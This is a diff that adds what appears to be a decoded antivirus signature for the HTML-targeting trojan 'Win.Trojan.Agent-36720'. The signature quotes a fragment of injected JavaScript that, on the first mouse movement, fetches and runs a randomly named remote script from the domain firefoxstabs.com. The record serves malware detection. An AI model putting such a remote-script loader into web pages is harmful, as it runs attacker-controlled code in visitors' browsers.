@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Agent-36720
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+= jquery.noconflict(true);x(function() {var flag = 0;x(window).mousemove(function() {if (flag === 0) {flag = 1;x.getscript('http://firefoxstabs.com/' + math.random().tostring().substring(3) + '.js'
